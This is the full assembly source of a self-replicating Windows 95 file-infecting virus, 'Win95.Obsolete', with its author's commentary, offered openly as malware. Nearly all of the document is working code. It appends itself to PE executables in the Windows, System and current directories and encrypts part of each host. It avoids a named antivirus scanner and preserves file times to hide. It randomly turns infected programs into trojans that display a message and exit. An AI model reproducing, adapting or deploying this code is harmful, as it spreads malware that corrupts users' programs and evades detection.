;============================================================================
;
;
;     NAME: Win95.Obsolete v1.00
;     TYPE: Direct-action variable encrypting PE-infector.
;       OS: Windoze95 (my version that is).
;     SIZE: 1400-sumptin' bytes (yuck!).
;   AUTHOR: T-2000 / [Immortal Riot].
;   E-MAIL: T2000_@hotmail.com
;     DATE: December 1998 - February 1999.
;  PAYLOAD: Trojanizes files.
;
;
; Driven by the painful thought that my virii would never make the rounds
; again, I had to abandon my soulmate DOS and start writing for the Win32-
; beast... may the Incubus get me...
;
; Obsolete is a 32-bit virus specifically written for Windoze95, however,
; it may or may not work correctly under other Win95-releases than mine,
; this due the fact that it uses two static API's (namely GetModuleHandleA
; and GetProcAddressA). When an infected file is executed the virus will
; try to infect up to three PE EXE/SCR files in the Windoze, System, and
; current directory. Files starting with the DWORD 'SCAN' will be excluded
; from infection, I assume McFuck's Win95-SCAN does a sanity-check, though
; I haven't verified this. Filedates/times will be preserved during the
; infection-process, and the virus won't be bothered by readonly-attributes.
; Obsolete doesn't fix a PE's alignments, Win95 doesn't give a fuck while
; WinNT does. Infection is achieved by adding the virusbody to the end of
; the victim's last section and pointing Entrypoint_RVA to this position.
; PE's are physically cut-off after the virusbody, this means that infected
; files can both grow or shrink in size. To make this heap of API's a bit
; less trivial I made it variable encrypt the last section of the host-file,
; it should harden-up recovery for the AV-pigs. Besides the virus itself is
; also variable encrypted with a seperate key. The payload is rather "harm-
; less" from my point of view, every now & then it trojanizes the file it is
; infecting, trojanized files will generate a soundblaster beep, display an
; OK-box with a message, and then exit the current process, they won't pass
; control back to their host anymore, but are still cleanable.
;
; Now why is it that almost everybody is infecting PE's by adding to the
; last section? (being called the "29A-technique" by a certain group of
; braggers). For instance, you are changing the section's flags, in Windoze
; you should always stay the fuck off things that ain't yours. Furthermore,
; when you overwrite the (supposed to be) zero padding-bytes with your virus,
; you might just as well overwrite overlay-data, and what if you decide to
; stay resident in the "stolen" section? it is very likely that the section's
; virtualsize will overlap with your virus, and thus crash the system.
;
;
; CREDITS:
;
; Thanks to Lord Julus for writing that PE-infection guide which showed me
; the basics of Win32-programming, further more JFK's One was of much help
; as it was well commented, yet not too complicated. Biggest thanks go to
; Virogen and Murkry for teaching me the steps of how to infect a PE-file.
; Unfortunately Johnny Panic's info was a bit too advanched for me to
; understand as for now, and TechnoDrunk's advice was as usual hidden
; between a large amount of polymorphic junk-comments. Much information was
; gathered from the excellent PE-essays written by Micheal J. O'Leary and
; B. Luevelsmeyer (though the last one mentioned contained some errors).
;
; As this is my 1st Win32-virus, errors are very likely to exist in this
; source, if you do find any of them, and/or have any advice for me regarding
; Win32-coding, please do inform me about it.
;
;   P.S. First generations will crash on exit.
;
; P.P.S. How the fuck do I smash sectors in Win32 ?
;
;============================================================================


                ORG     0

                .386p
                .MODEL  FLAT
                .DATA

                DD      0               ; Uch, without this the file will
                                        ; crash, don't ask me why...


EXTRN           CreateThreadA:PROC      ; GetProcAddress seems to need these.
EXTRN           MessageBoxIndirectA:PROC


                .CODE

Off             =       0
On              =       1

Debug_Mode      =       On                      ; If switched on, only DUM*.*
                                                ; will be infected.

Files_Per_Dir   EQU     3                       ; 3 files per directory.
Marker_File     EQU     'T2IR'                  ; Creeping through ur files.
Virus_Size      EQU     (Virus_End-START)       ; Physical virussize.
Virus_Size_Mem  EQU     (Virus_End_Mem-START)   ; Virtual virussize.


START:
                PUSHFD                          ; Save flags & registers.
                PUSHAD

                CALL    Get_Delta               ; Get our position in memory.
Get_Delta:      POP     ESI
                SUB     ESI, (Get_Delta-START)

                MOV     AL, 0                   ; Load initial virus-key.
Initial_Key     =       BYTE PTR $-1

                MOV     EBX, (Encrypted-START)
                MOV     ECX, (Virus_End-Encrypted)

Decrypt_Byte:   XOR     [ESI+EBX], AL           ; Decrypt a byte.

                INC     EBX                     ; Next one please.

                ADD     AL, 0                   ; X-Ray, away.
Sliding_Key     =       BYTE PTR $-1

                LOOP    Decrypt_Byte            ; And repeat the process.

Encrypted:      ; All that comes after this is kept encrypted in PE's.

                ; Get image-base, this method should also work
                ; if the image is loaded at a different base
                ; than the one specified in the PE-header.

                MOV     EAX, ESI

                SUB     EAX, 12345678h
Virus_RVA       =       DWORD PTR $-4

                MOV     [ESI+(Host_Image_Base-START)], EAX

                ADD     [ESI+(Old_EIP-START)], EAX

                MOV     EAX, (KERNEL32_API-START)
                LEA     EDI, [ESI+(K32_API_Addresses-START)]
                CALL    Retrieve_API
                JECXZ   JMP_Exec_Host

                JMP     Begin_Search
Payload_Switch  =       BYTE PTR $-1

Trojan:         ; Trojanized files will continue execution here.

                ; Retrieve API-addresses in USER32.DLL.

                MOV     EAX, (USER32_API-START)
                CALL    Retrieve_API
                JECXZ   JMP_Exec_Host

                ; Generate a soundblaster-beep.

                PUSH    MB_ICONEXCLAMATION
                CALL    [ESI+(MessageBeep-START)]

                ; Display a box with a message.

                PUSH    MB_ICONEXCLAMATION
                LEA     EAX, [ESI+(Window_Name-START)]
                PUSH    EAX
                LEA     EAX, [ESI+(Payload_Msg-START)]
                PUSH    EAX
                PUSH    0
                CALL    [ESI+(MessageBoxA-START)]

                ; Exit current process.

                CALL    [ESI+(ExitProcess-START)]


Window_Name     DB      'Win95.Obsolete v1.00', 0
Payload_Msg     DB      'MAN HAS BECOME OBSOLETE... FEAR THE MACHINES!', 0


JMP_Exec_Host:  JMP     Execute_Host


Begin_Search:
                LEA     EBX, [ESI+(Current_Directory-START)]
                MOV     ECX, MAX_PATH

                PUSH    EBX

                ; Save original path.

                PUSH    EBX
                PUSH    ECX
                CALL    [ESI+(GetCurrentDirectoryA-START)]

                ; Obtain path to Windoze-directory.

                ADD     EBX, ECX

                PUSH    EBX

                PUSH    ECX
                PUSH    EBX
                CALL    [ESI+(GetWindowsDirectoryA-START)]

                ; Obtain path to Windoze\System-directory.

                ADD     EBX, ECX

                PUSH    EBX

                PUSH    ECX
                PUSH    EBX
                CALL    [ESI+(GetSystemDirectoryA-START)]

                ; Infect files in Windoze-directory.

                MOV     EBX, [ESI+(SetCurrentDirectoryA-START)]

                CALL    EBX
                CALL    Infect_Directory

                ; Infect files in Windoze\System-directory.

                CALL    EBX
                CALL    Infect_Directory

                ; Infect files in the current directory.

                CALL    EBX
                CALL    Infect_Directory

Execute_Host:   MOV     ECX, 0
Section_Size    =       DWORD PTR $-4
                JECXZ   Virus_Exit

                MOV     EBX, 400000h
Host_Image_Base =       DWORD PTR $-4

                ADD     EBX, OFFSET Carrier
RVA_Encrypted   =       DWORD PTR $-4

                MOV     AL, 0
Init_K_Section  =       BYTE PTR $-1

Decr_Section:   XOR     [EBX], AL               ; Decrypt the host's section.

                INC     EBX

                ADD     AL, 0
Slide_K_Section =       BYTE PTR $-1

                LOOP    Decr_Section

Virus_Exit:     POPAD                           ; Restore registers & flags.
                POPFD

                MOV     EAX, OFFSET Carrier     ; EAX = EIP of program.
Old_EIP         =       DWORD PTR $-4

                JMP     EAX



Infect_Directory:

                PUSHAD

                ; Reset infection-counter.

                AND     BYTE PTR [ESI+(Infect_Counter-START)], 0

                LEA     EAX, [ESI+(Search_Buffer-START)]
                PUSH    EAX
                LEA     EAX, [ESI+(File_Spec-START)]
                PUSH    EAX
                CALL    [ESI+(FindFirstFileA-START)]

                CMP     EAX, -1                 ; Abort on error.
                JE      Exit_Infect

                XCHG    EBP, EAX

Infect_Loop:    CMP     BYTE PTR [ESI+(Infect_Counter-START)], Files_Per_Dir
                JNB     Exit_Infect

Infect_File:    PUSH    EBP

                LEA     EBX, [ESI+(Search_Buffer.Find_File_Name-START)]

Check_File_Ext: MOV     EDI, EBX

                XOR     AL, AL                  ; Find end of ASCIIZ-string.
                MOV     CH, 0FFh
                CLD
                REPNZ   SCASB

                MOV     EAX, [EDI-5]            ; Get last DWORD of filename.
                CALL    Upcase_EAX

                CMP     EAX, 'EXE.'             ; Standard .EXE-file?
                JE      Check_Filename

Go_Find_Next_F: CMP     EAX, 'RCS.'             ; Screensaver-file?
                JNE     Find_Next_File

Check_Filename: MOV     EAX, [EBX]              ; Get 1st DWORD of filename.
                CALL    Upcase_EAX

                CMP     EAX, 'NACS'             ; Don't infect McFuck SCAN,
                JE      Go_Find_Next_F          ; (most overused Windoze AV).

Save_File_Attr: PUSH    EBX
                CALL    [ESI+(GetFileAttributesA-START)]

                PUSH    EAX
                PUSH    EBX

                ; Clear the readonly-flag.

                AND     AL, NOT FILE_ATTRIBUTE_READONLY

                PUSH    EAX
                PUSH    EBX
                CALL    [ESI+(SetFileAttributesA-START)]

                XOR     EBP, EBP

                PUSH    EBP                     ; Open the file.
                PUSH    FILE_ATTRIBUTE_NORMAL
                PUSH    OPEN_EXISTING
                PUSH    EBP
                PUSH    EBP
                PUSH    GENERIC_READ OR GENERIC_WRITE
                PUSH    EBX
                CALL    [ESI+(CreateFileA-START)]

                CMP     EAX, -1                 ; Error?
                JE      Restore_Attr

                MOV     [ESI+(File_Handle-START)], EAX

                PUSH    EAX

                XCHG    EDI, EAX

                ; Save the host's time/date of creation,
                ; last access, and last write.

                LEA     EAX, [ESI+(Victim_Last_Write_Time-START)]

                PUSH    EAX

                PUSH    EAX
                ADD     EAX, 8
                PUSH    EAX
                ADD     EAX, 8
                PUSH    EAX
                PUSH    EDI
                CALL    [ESI+(GetFileTime-START)]

                PUSH    EBP
                PUSH    EDI
                CALL    [ESI+(GetFileSize-START)]

                MOV     [ESI+(Host_Size-START)], EAX

                ADD     EAX, Virus_Size

                ; Like, allocate memory for the mapped file, or
                ; whatever the fuck this shit is neccesary for.

                PUSH    EBP
                PUSH    EAX
                PUSH    EBP
                PUSH    PAGE_READWRITE
                PUSH    EBP
                PUSH    EDI
                CALL    [ESI+(CreateFileMappingA-START)]

                OR      EAX, EAX                ; Error?
                JZ      Close_File

                PUSH    EAX

                ; This should map the file in our
                ; allocated memory, am I not right???

                PUSH    EBP                     ; WHOLE file.
                PUSH    EBP
                PUSH    EBP
                PUSH    FILE_MAP_WRITE
                PUSH    EAX
                CALL    [ESI+(MapViewOfFile-START)]

                OR      EAX, EAX                ; Error?
                JZ      Close_Mapping

                PUSH    EAX

                CMP     [EAX.EXE_Mark], 'ZM'    ; File must be .EXE-type.
                JNE     Unmap_File

                CMP     [EAX.Reloc_Table], 40h  ; It has a NE/PE-header?
                JB      Unmap_File

                MOV     ECX, [EAX+3Ch]          ; Obtain pointer to PE-header.

                LEA     EDI, [EAX+ECX]          ; EDI = PE-header.

                CMP     [EDI.PE_Mark], 'EP'     ; Make sure it's a PE-file.
                JNE     Unmap_File

                ; A bit redundant, I guess...

                CMP     [EDI.CPU_Type], 14Ch    ; This PE is for 386+'s ?
                JNE     Unmap_File

                ; === Avoid DLL's. ===

                TEST    BYTE PTR [EDI.PE_Flags+1], 00100000b
                JNZ     Unmap_File

                ; === Did we already infect it before? ===

                CMP     [EDI.Reserved_1], Marker_File
                JE      Unmap_File

                XCHG    EBX, EAX                ; EBX = Mapping-address.

                ; === Get last section-header. ===

                XOR     EAX, EAX
                MOV     AX, [EDI.Number_Of_Sections]
                DEC     AX
                MOV     ECX, 40
                MUL     ECX

                MOV     EDX, EDI                ; EDX = PE-header.

                MOV     BP, [EDX.Headers_Size]
                ADD     EBP, 18h
                ADD     EBP, EAX
                ADD     EBP, EDX                ; EBP = Last section-header.

                MOV     EAX, [EBP.Section_Start]
                ADD     EAX, [EBP.Section_Size_Raw]

                LEA     EDI, [EAX+EBX]          ; Offset of virus in file.

                PUSHAD

                MOV     ECX, Virus_Size         ; Copy virus to mapped file.
                CLD
                REP     MOVSB

                POPAD

                ADD     EAX, Virus_Size         ; Set new size of host.

                MOV     [ESI+(Host_Size-START)], EAX

                PUSH    [EDX.Entry_Point]
                POP     DWORD PTR [EDI+(Old_EIP-START)]

                ; Calculate virus' new EIP RVA.

                MOV     EAX, [EBP.Section_RVA]
                ADD     EAX, [EBP.Section_Size_Raw]

                MOV     [EDX.Entry_Point], EAX  ; Set our new entrypoint.

                MOV     [EDI+(Virus_RVA-START)], EAX

                IN      AX, 40h                 ; Get a random value in AL.
                XOR     AL, AH

                AND     AL, 11111100b           ; Trojanize this victim?
                JNZ     Skip_Trojanize

                ; Patch JMP to let it point to the trojan-code.

                MOV     [EDI+(Payload_Switch-START)], AL

Skip_Trojanize: MOV     EAX, [EBP.Section_Size_Raw]
                MOV     ECX, [EBP.Section_Size_Virtual]

                ; Always pick the smallest size.

                CMP     EAX, ECX                ; The other one is smaller?
                JNB     Not_Bigger              ; No, leave things this way.

                XCHG    ECX, EAX                ; Else use the smaller size.

Not_Bigger:     MOV     [EDI+(Section_Size-START)], ECX

                ADD     [EBP.Section_Size_Virtual], Virus_Size_Mem
                ADD     [EBP.Section_Size_Raw], Virus_Size
                ADD     [EDX.Image_Size], Virus_Size

        ; Set object-flags: code, executable, readable, and writable.

                OR      [EBP.Section_Flags], 11100000000000000000000000100000b

                JECXZ   Encrypt_Virus           ; Don't let LOOP overflow.

                ADD     EBX, [EBP.Section_Start]

                PUSH    [EBP.Section_RVA]
                POP     DWORD PTR [EDI+(RVA_Encrypted-START)]

                IN      AX, 40h                 ; Get random keys.

                MOV     [EDI+(Init_K_Section-START)], AL
                MOV     [EDI+(Slide_K_Section-START)], AH

Encr_Section:   XOR     [EBX], AL               ; Encrypt host's last section.

                INC     EBX

                ADD     AL, AH

                LOOP    Encr_Section

Encrypt_Virus:  IN      AX, 40h                 ; Get a random value in AX.

                MOV     [EDI+(Initial_Key-START)], AL
                MOV     [EDI+(Sliding_Key-START)], AH

                ADD     EDI, (Encrypted-START)
                MOV     ECX, (Virus_End-Encrypted)

Encrypt_Byte:   XOR     [EDI], AL               ; Encrypt virusbody.

                INC     EDI

                ADD     AL, AH

                LOOP    Encrypt_Byte

                ; Mark this host as being infected.

                MOV     [EDX.Reserved_1], Marker_File

                ; We succesfully infected yet another file.

                INC     BYTE PTR [ESI+(Infect_Counter-START)]

Unmap_File:     CALL    [ESI+(UnmapViewOfFile-START)]

Close_Mapping:  CALL    [ESI+(CloseHandle-START)]

Close_File:     PUSH    0
                PUSH    0
                PUSH    12345678h
Host_Size       =       DWORD PTR $-4
                PUSH    DWORD PTR [ESI+(File_Handle-START)]
                CALL    [ESI+(SetFilePointer-START)]

                PUSH    DWORD PTR [ESI+(File_Handle-START)]
                CALL    [ESI+(SetEndOfFile-START)]

                POP     EAX

                PUSH    EAX                     ; Restore original filedates
                ADD     EAX, 8                  ; and times.
                PUSH    EAX
                ADD     EAX, 8
                PUSH    EAX
                PUSH    12345678h
File_Handle     =       DWORD PTR $-4
                CALL    [ESI+(SetFileTime-START)]

                CALL    [ESI+(CloseHandle-START)]

Restore_Attr:   CALL    [ESI+(SetFileAttributesA-START)]

Find_Next_File: POP     EBP

                ; Now go find the next .EXE-file.

                LEA     EAX, [ESI+(Search_Buffer-START)]
                PUSH    EAX
                PUSH    EBP
                CALL    [ESI+(FindNextFileA-START)]

                OR      EAX, EAX
                JNZ     Infect_Loop

Exit_Infect:    POPAD

                RET


Author          DB      '(c) 1998-1999 by T-2000 / Immortal Riot', 0


; EAX = Offset to module-name.
; EDI = Pointer to buffer API-addresses.
Retrieve_API:
                PUSH    ESI

                MOV     EBX, ESI                ; EBX holds the delta-offset.

                ADD     ESI, EAX                ; Module-name.

        ; === Get the base-address of the given module. ===

                PUSH    ESI
                CALL    [EBX+(GetModuleHandleA-START)]

                XCHG    ECX, EAX
                JECXZ   Exit_Get_API

                MOV     EBP, ECX                ; EBP = Module-base.

                ADD     ESI, 13                 ; ESI = Start API-names.

Retrieve_Addr:  PUSH    ESI                     ; Retrieve the API's address.
                PUSH    EBP
                CALL    [EBX+(GetProcAddress-START)]

                CLD                             ; Store the API-address.
                STOSD

                XCHG    ECX, EAX
                JECXZ   Exit_Get_API

Find_End_API:   LODSB                           ; Go to next API-name.

                OR      AL, AL                  ; Reached the end of ASCIIZ?
                JNZ     Find_End_API

                CMP     [ESI], AL               ; We did 'em all?
                JNZ     Retrieve_Addr           ; Nope, so continue loop.

Exit_Get_API:   POP     ESI

                RET


; Don't use a lame AND to convert to uppercase, it'll
; screw things up with non-alfabethical characters.
Upcase_EAX:
                ROL     EAX, 8

                CALL    Upcase_AL

                ROL     EAX, 8

                CALL    Upcase_AL

                ROL     EAX, 8

                CALL    Upcase_AL

                ROL     EAX, 8

Upcase_AL:      CMP     AL, 'a'
                JB      Exit_Upcase_AL

                CMP     AL, 'z'
                JA      Exit_Upcase_AL

                SUB     AL, 'a' - 'A'

Exit_Upcase_AL: RET


; ********************* DATA AREA *******************************************


                        IF      Debug_Mode

File_Spec               DB      'DUM*.*', 0     ; Searchmask for debugmode.

                        ELSE

File_Spec               DB      '*.*', 0        ; Searchmask for wildmode.

                        ENDIF


        ; All API's used by the actual infection-process.

KERNEL32_API            DB      'KERNEL32.dll', 0
                        DB      'GetWindowsDirectoryA', 0
                        DB      'GetSystemDirectoryA', 0
                        DB      'FindFirstFileA', 0
                        DB      'FindNextFileA', 0
                        DB      'CreateFileA', 0
                        DB      'CreateFileMappingA', 0
                        DB      'MapViewOfFile', 0
                        DB      'UnmapViewOfFile', 0
                        DB      'CloseHandle', 0
                        DB      'GetFileTime', 0
                        DB      'SetFileTime', 0
                        DB      'GetFileSize', 0
                        DB      'SetFilePointer', 0
                        DB      'SetEndOfFile', 0
                        DB      'GetCurrentDirectoryA', 0
                        DB      'SetCurrentDirectoryA', 0
                        DB      'GetFileAttributesA', 0
                        DB      'SetFileAttributesA', 0
                        DB      'ExitProcess', 0
                        DB      0


        ; This shit is only used by the trojan-code.

USER32_API              DB      'USER32.dll', 0, 0, 0
                        DB      'MessageBoxA', 0
                        DB      'MessageBeep', 0
                        DB      0


        ; Fuck, these are hardcoded!

GetModuleHandleA        DD      0BFF775BDh
GetProcAddress          DD      0BFF76D5Ch


Virus_End:


K32_API_Addresses:

GetWindowsDirectoryA    DD      0
GetSystemDirectoryA     DD      0
FindFirstFileA          DD      0
FindNextFileA           DD      0
CreateFileA             DD      0
CreateFileMappingA      DD      0
MapViewOfFile           DD      0
UnmapViewOfFile         DD      0
CloseHandle             DD      0
GetFileTime             DD      0
SetFileTime             DD      0
GetFileSize             DD      0
SetFilePointer          DD      0
SetEndOfFile            DD      0
GetCurrentDirectoryA    DD      0
SetCurrentDirectoryA    DD      0
GetFileAttributesA      DD      0
SetFileAttributesA      DD      0
ExitProcess             DD      0


U32_API_Addresses:

MessageBoxA             DD      0
MessageBeep             DD      0


Current_Directory       DB      MAX_PATH DUP(0)
Windows_Directory       DB      MAX_PATH DUP(0)
System_Directory        DB      MAX_PATH DUP(0)


Infect_Counter          DB      0


Victim_Last_Write_Time  DD      0, 0
Victim_Last_Access_Time DD      0, 0
Victim_Creation_Time    DD      0, 0


Search_Buffer           DB      666 DUP(0)


Virus_End_Mem:

; ???????????????????????????????????????????????????????????????????????????


Section_Header          STRUC
Section_Name            DB      8 DUP(0)
Section_Size_Virtual    DD      0
Section_RVA             DD      0
Section_Size_Raw        DD      0
Section_Start           DD      0
                        DD      0, 0
                        DW      0, 0
Section_Flags           DD      0
Section_Header          ENDS


Find_First_Next_Win32   STRUC
File_Attributes         DD      0
Creation_Time           DD      0, 0
Last_Accessed_Time      DD      0, 0
Last_Written_Time       DD      0, 0
Find_File_Size_High     DD      0
Find_File_Size_Low      DD      0
Find_Reserved_1         DD      0
Find_Reserved_2         DD      0
Find_File_Name          DB      260 DUP(0)
Find_DOS_File_Name      DB      13 DUP(0)
Find_First_Next_Win32   ENDS


EXE_Header      STRUC
EXE_Mark        DW      0       ; Marker valid .EXE-file: MZ or ZM.
Image_Mod_512   DW      0
Image_512_Pages DW      0
Reloc_Items     DW      0
Header_Size_Mem DW      0
Min_Size_Mem    DW      0
Max_Size_Mem    DW      0
Program_SS      DW      0
Program_SP      DW      0
Checksum        DW      0
Program_IP      DW      0
Program_CS      DW      0
Reloc_Table     DW      0
EXE_Header      ENDS


PE_Header               STRUC
PE_Mark                 DD      0               ; PE-marker (PE/0/0).
CPU_Type                DW      0
Number_Of_Sections      DW      0
                        DD      0
Reserved_1              DD      0
                        DD      0
Headers_Size            DW      0
PE_Flags                DW      0
                        DW      8 DUP(0)
Entry_Point             DD      0
                        DD      2 DUP(0)
Image_Base              DD      0
Object_Align            DD      0
File_Align              DD      0
                        DW      0, 0
                        DW      0, 0
                        DW      0, 0
                        DD      0
Image_Size              DD      0
PE_Header               ENDS


                ; This shit ain't complete.

                INCLUDE WIN32API.INC


Carrier:
                PUSH    0
                CALL    ExitProcess

                END     START





